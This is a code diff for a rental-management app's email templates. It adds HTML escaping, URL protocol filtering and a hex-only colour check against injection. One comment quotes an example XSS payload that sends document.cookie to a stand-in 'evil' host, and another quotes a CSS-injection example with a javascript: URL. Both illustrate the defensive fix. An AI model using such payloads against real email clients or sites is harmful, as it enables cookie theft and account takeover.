@@ -35,6 +35,41 @@ export async function sendEmail(options: EmailOptions) {
   }
 }
 
+/**
+ * Escapa HTML entities — TODA interpolação dinâmica em template de email
+ * passa por aqui. Sem isso, um cliente com nome
+ * `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>` detonava
+ * XSS no inbox do operador que abrisse o email (clients tipo Outlook
+ * antigamente renderizavam scripts em algumas versões + o vetor mais real é
+ * leak de cookies via tracking pixel).
+ */
+function esc(v: unknown): string {
+  if (v === null || v === undefined) return ""
+  return String(v)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;")
+}
+
+/**
+ * Sanitiza URL pra atributos `href`/`src`. Rejeita protocolos perigosos
+ * (`javascript:`, `data:` exceto imagens, `vbscript:`, etc) e escapa entities.
+ *
+ * Provider de NF pode em tese retornar URLs maliciosas — passamos por aqui
+ * antes de embutir no email.
+ */
+function safeUrl(url: unknown, fallback = "#"): string {
+  if (typeof url !== "string") return fallback
+  const trimmed = url.trim()
+  // Aceita apenas http(s) e data:image/...
+  if (!/^https?:\/\//i.test(trimmed) && !/^data:image\//i.test(trimmed)) {
+    return fallback
+  }
+  return esc(trimmed)
+}
+
 // Templates de Email
 export function getRentalConfirmationEmail(data: {
   customerName: string
@@ -62,16 +97,16 @@ export function getRentalConfirmationEmail(data: {
       <body>
         <div class="container">
           <div class="header">
-            <h1>${data.companyName}</h1>
+            <h1>${esc(data.companyName)}</h1>
           </div>
           <div class="content">
-            <h2>Olá, ${data.customerName}!</h2>
+            <h2>Olá, ${esc(data.customerName)}!</h2>
             <p>Sua locação foi confirmada com sucesso.</p>
 
             <div class="highlight">
-              <strong>Contrato:</strong> #${data.contractNumber}<br>
-              <strong>Período:</strong> ${data.startDate} a ${data.endDate}<br>
-              <strong>Valor Total:</strong> ${data.total}
+              <strong>Contrato:</strong> #${esc(data.contractNumber)}<br>
+              <strong>Período:</strong> ${esc(data.startDate)} a ${esc(data.endDate)}<br>
+              <strong>Valor Total:</strong> ${esc(data.total)}
             </div>
 
             <p>Em breve você receberá mais informações sobre a entrega/retirada dos equipamentos.</p>
@@ -80,7 +115,7 @@ export function getRentalConfirmationEmail(data: {
           </div>
           <div class="footer">
             <p>Este é um email automático. Por favor, não responda.</p>
-            <p>${data.companyName}</p>
+            <p>${esc(data.companyName)}</p>
           </div>
         </div>
       </body>
@@ -117,11 +152,11 @@ export function getRentalReminderEmail(data: {
             <h1>Lembrete de Devolução</h1>
           </div>
           <div class="content">
-            <h2>Olá, ${data.customerName}!</h2>
+            <h2>Olá, ${esc(data.customerName)}!</h2>
 
             <div class="warning">
-              <strong>Atenção:</strong> Sua locação (Contrato #${data.contractNumber})
-              vence em <strong>${data.daysRemaining} dia(s)</strong> (${data.endDate}).
+              <strong>Atenção:</strong> Sua locação (Contrato #${esc(data.contractNumber)})
+              vence em <strong>${esc(data.daysRemaining)} dia(s)</strong> (${esc(data.endDate)}).
             </div>
 
             <p>Por favor, providencie a devolução dos equipamentos até a data prevista para evitar multas por atraso.</p>
@@ -130,7 +165,7 @@ export function getRentalReminderEmail(data: {
           </div>
           <div class="footer">
             <p>Este é um email automático. Por favor, não responda.</p>
-            <p>${data.companyName}</p>
+            <p>${esc(data.companyName)}</p>
           </div>
         </div>
       </body>
@@ -174,13 +209,13 @@ export function getOverdueNotificationEmail(data: {
             <h1>Locação em Atraso</h1>
           </div>
           <div class="content">
-            <h2>Olá, ${data.customerName}!</h2>
+            <h2>Olá, ${esc(data.customerName)}!</h2>
 
             <div class="alert">
-              <strong>Atenção:</strong> Sua locação (Contrato #${data.contractNumber})
-              está em atraso há <strong>${data.daysOverdue} dia(s)</strong>.<br><br>
-              <strong>Equipamentos:</strong> ${data.equipmentList}<br>
-              <strong>Multa acumulada:</strong> ${lateFeeFormatted}
+              <strong>Atenção:</strong> Sua locação (Contrato #${esc(data.contractNumber)})
+              está em atraso há <strong>${esc(data.daysOverdue)} dia(s)</strong>.<br><br>
+              <strong>Equipamentos:</strong> ${esc(data.equipmentList)}<br>
+              <strong>Multa acumulada:</strong> ${esc(lateFeeFormatted)}
             </div>
 
             <p>Por favor, entre em contato conosco imediatamente para regularizar a situação.</p>
@@ -189,7 +224,7 @@ export function getOverdueNotificationEmail(data: {
           </div>
           <div class="footer">
             <p>Este é um email automático. Por favor, não responda.</p>
-            <p>${data.companyName}${data.companyPhone ? ` - ${data.companyPhone}` : ""}</p>
+            <p>${esc(data.companyName)}${data.companyPhone ? ` - ${esc(data.companyPhone)}` : ""}</p>
           </div>
         </div>
       </body>
@@ -228,10 +263,16 @@ function shell(
   footer: string,
   branding?: EmailBranding
 ) {
-  const headerColor = branding?.headerColor || defaultHeaderColor
+  // headerColor SÓ aceita formato hex (defesa contra branding com CSS
+  // injection tipo `red; background-image: url(javascript:...)` etc).
+  const safeColor = branding?.headerColor && /^#[0-9a-fA-F]{3,8}$/.test(branding.headerColor)
+    ? branding.headerColor
+    : defaultHeaderColor
   const logo = branding?.logoUrl
-    ? `<img src="${branding.logoUrl}" alt="" style="max-height: 56px; max-width: 200px; margin-bottom: 8px; display: inline-block;" />`
+    ? `<img src="${safeUrl(branding.logoUrl, "")}" alt="" style="max-height: 56px; max-width: 200px; margin-bottom: 8px; display: inline-block;" />`
     : ""
+  // title é constante interna — não escapado. inner/footer são montados pelos
+  // callers com `esc()` em cada interpolação dinâmica.
   return `
     <!DOCTYPE html>
     <html>
@@ -239,16 +280,16 @@ function shell(
       <style>
         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
         .container { max-width: 600px; margin: 0 auto; padding: 20px; }
-        .header { background: ${headerColor}; color: white; padding: 20px; text-align: center; }
+        .header { background: ${safeColor}; color: white; padding: 20px; text-align: center; }
         .content { padding: 20px; background: #f9fafb; }
         .footer { padding: 20px; text-align: center; font-size: 12px; color: #666; }
         .box { padding: 15px; border-radius: 8px; margin: 15px 0; }
-        .button { display: inline-block; background: ${headerColor}; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin: 16px 0; }
+        .button { display: inline-block; background: ${safeColor}; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; margin: 16px 0; }
       </style>
     </head>
     <body>
       <div class="container">
-        <div class="header">${logo}<h1 style="margin: 0;">${title}</h1></div>
+        <div class="header">${logo}<h1 style="margin: 0;">${esc(title)}</h1></div>
         <div class="content">${inner}</div>
         <div class="footer">${footer}</div>
       </div>
@@ -269,15 +310,15 @@ export function getPasswordResetEmail(data: {
       "#2563eb",
       company,
       `
-        <h2>Olá, ${data.userName}!</h2>
+        <h2>Olá, ${esc(data.userName)}!</h2>
         <p>Recebemos uma solicitação para redefinir a senha da sua conta.</p>
         <p style="text-align: center;">
-          <a href="${data.resetLink}" class="button">Redefinir Senha</a>
+          <a href="${safeUrl(data.resetLink)}" class="button">Redefinir Senha</a>
         </p>
         <p><strong>Este link expira em 1 hora.</strong></p>
         <p>Se você não solicitou, ignore este e-mail.</p>
       `,
-      `<p>Este é um e-mail automático. Por favor, não responda.</p><p>${company}</p>`
+      `<p>Este é um e-mail automático. Por favor, não responda.</p><p>${esc(company)}</p>`
     ),
   }
 }
@@ -294,15 +335,15 @@ export function getEmailVerifyEmail(data: {
       "#10b981",
       "Confirme seu email",
       `
-        <h2>Olá, ${data.userName}!</h2>
+        <h2>Olá, ${esc(data.userName)}!</h2>
         <p>Pra ativar sua conta, confirme seu endereço de email clicando no botão abaixo:</p>
         <p style="text-align: center;">
-          <a href="${data.verifyLink}" class="button">Confirmar meu email</a>
+          <a href="${safeUrl(data.verifyLink)}" class="button">Confirmar meu email</a>
         </p>
         <p><strong>Este link expira em 24 horas.</strong></p>
         <p>Se você não criou conta no LocaTech, ignore este email.</p>
       `,
-      `<p>${company}</p>`
+      `<p>${esc(company)}</p>`
     ),
   }
 }
@@ -318,14 +359,14 @@ export function getWelcomeEmail(data: {
       "#10b981",
       "Bem-vindo!",
       `
-        <h2>Olá, ${data.userName}!</h2>
+        <h2>Olá, ${esc(data.userName)}!</h2>
         <p>Seu cadastro foi concluído com sucesso. Agora você pode acessar o sistema e começar a gerenciar a sua locadora.</p>
         <p style="text-align:center;">
-          <a href="${data.loginUrl}" class="button">Acessar o Sistema</a>
+          <a href="${safeUrl(data.loginUrl)}" class="button">Acessar o Sistema</a>
         </p>
         <p>Bom trabalho!</p>
       `,
-      `<p>${data.companyName}</p>`
+      `<p>${esc(data.companyName)}</p>`
     ),
   }
 }
@@ -345,15 +386,15 @@ export function getRentalReturnedEmail(data: {
       "#10b981",
       "Devolução Confirmada",
       `
-        <h2>Olá, ${data.customerName}!</h2>
-        <p>A devolução do contrato <strong>#${data.contractNumber}</strong> foi registrada em ${data.returnDate}.</p>
+        <h2>Olá, ${esc(data.customerName)}!</h2>
+        <p>A devolução do contrato <strong>#${esc(data.contractNumber)}</strong> foi registrada em ${esc(data.returnDate)}.</p>
         <div class="box" style="background: #d1fae5;">
-          <strong>Valor total:</strong> ${data.total}
-          ${data.hasDamage ? `<br><strong>Valor por danos:</strong> ${data.damageValue ?? "-"}` : ""}
+          <strong>Valor total:</strong> ${esc(data.total)}
+          ${data.hasDamage ? `<br><strong>Valor por danos:</strong> ${esc(data.damageValue ?? "-")}` : ""}
         </div>
         <p>Agradecemos a preferência!</p>
       `,
-      `<p>${data.companyName}</p>`
+      `<p>${esc(data.companyName)}</p>`
     ),
   }
 }
@@ -373,17 +414,17 @@ export function getInvoiceIssuedEmail(data: {
       "#0ea5e9",
       "Nota Fiscal Emitida",
       `
-        <h2>Olá, ${data.customerName}!</h2>
-        <p>A nota fiscal referente ao contrato <strong>#${data.contractNumber}</strong> foi emitida.</p>
+        <h2>Olá, ${esc(data.customerName)}!</h2>
+        <p>A nota fiscal referente ao contrato <strong>#${esc(data.contractNumber)}</strong> foi emitida.</p>
         <div class="box" style="background: #e0f2fe;">
-          <strong>Número:</strong> ${data.invoiceNumber}<br>
-          <strong>Valor:</strong> ${data.amount}
+          <strong>Número:</strong> ${esc(data.invoiceNumber)}<br>
+          <strong>Valor:</strong> ${esc(data.amount)}
         </div>
-        ${data.pdfUrl ? `<p style="text-align:center;"><a href="${data.pdfUrl}" class="button">Baixar PDF da nota</a></p>` : ""}
-        ${data.xmlUrl ? `<p style="text-align:center;"><a href="${data.xmlUrl}" style="color:#0ea5e9; text-decoration:underline;">Baixar XML</a></p>` : ""}
+        ${data.pdfUrl ? `<p style="text-align:center;"><a href="${safeUrl(data.pdfUrl)}" class="button">Baixar PDF da nota</a></p>` : ""}
+        ${data.xmlUrl ? `<p style="text-align:center;"><a href="${safeUrl(data.xmlUrl)}" style="color:#0ea5e9; text-decoration:underline;">Baixar XML</a></p>` : ""}
         <p>Guarde a nota para sua contabilidade.</p>
       `,
-      `<p>${data.companyName}</p>`
+      `<p>${esc(data.companyName)}</p>`
     ),
   }
 }
@@ -400,14 +441,14 @@ export function getDepositReturnedEmail(data: {
       "#0ea5e9",
       "Caução Devolvida",
       `
-        <h2>Olá, ${data.customerName}!</h2>
-        <p>A caução do contrato <strong>#${data.contractNumber}</strong> foi devolvida.</p>
+        <h2>Olá, ${esc(data.customerName)}!</h2>
+        <p>A caução do contrato <strong>#${esc(data.contractNumber)}</strong> foi devolvida.</p>
         <div class="box" style="background: #dbeafe;">
-          <strong>Valor:</strong> ${data.depositAmount}
+          <strong>Valor:</strong> ${esc(data.depositAmount)}
         </div>
         <p>Caso tenha dúvidas, entre em contato.</p>
       `,
-      `<p>${data.companyName}</p>`
+      `<p>${esc(data.companyName)}</p>`
     ),
   }
 }
@@ -441,21 +482,21 @@ export function getMaintenanceAlertEmail(data: {
             <h1>Alerta de Manutenção</h1>
           </div>
           <div class="content">
-            <h2>Olá, ${data.userName}!</h2>
+            <h2>Olá, ${esc(data.userName)}!</h2>
 
-            <p>Um equipamento está com manutenção ${data.maintenanceType.toLowerCase()} agendada.</p>
+            <p>Um equipamento está com manutenção ${esc(data.maintenanceType.toLowerCase())} agendada.</p>
 
             <div class="info">
-              <strong>Equipamento:</strong> ${data.equipmentCode} - ${data.equipmentName}<br>
-              <strong>Tipo:</strong> Manutenção ${data.maintenanceType}<br>
-              <strong>Data Agendada:</strong> ${data.scheduledDate}
+              <strong>Equipamento:</strong> ${esc(data.equipmentCode)} - ${esc(data.equipmentName)}<br>
+              <strong>Tipo:</strong> Manutenção ${esc(data.maintenanceType)}<br>
+              <strong>Data Agendada:</strong> ${esc(data.scheduledDate)}
             </div>
 
             <p>Acesse o sistema para mais detalhes e acompanhar a manutenção.</p>
           </div>
           <div class="footer">
             <p>Este é um email automático.</p>
-            <p>${data.companyName}</p>
+            <p>${esc(data.companyName)}</p>
           </div>
         </div>
       </body>
